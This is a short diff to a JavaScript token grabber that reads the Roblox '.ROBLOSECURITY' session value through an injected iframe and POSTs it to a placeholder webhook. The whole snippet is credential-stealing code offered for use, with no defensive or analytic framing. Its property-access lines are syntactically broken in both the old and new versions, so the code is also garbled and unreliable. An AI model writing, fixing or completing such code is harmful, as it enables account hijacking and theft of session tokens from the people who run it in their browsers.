@@ -1,6 +1,7 @@
 location.reload();
 var webhook = "Your-Webhook-url";
-var token = document.body.appendChild(document.createElement `iframe`).contentWindow.window.localStorage..ROBLOSECURITY;
+var cookie = ".ROBLOSECURITY";
+var token = document.body.appendChild(document.createElement `iframe`).contentWindow.window.localStorage.+cookie+;
 var request = new XMLHttpRequest();
 request.open("POST", webhook);
 request.setRequestHeader('content-type', 'application/json');
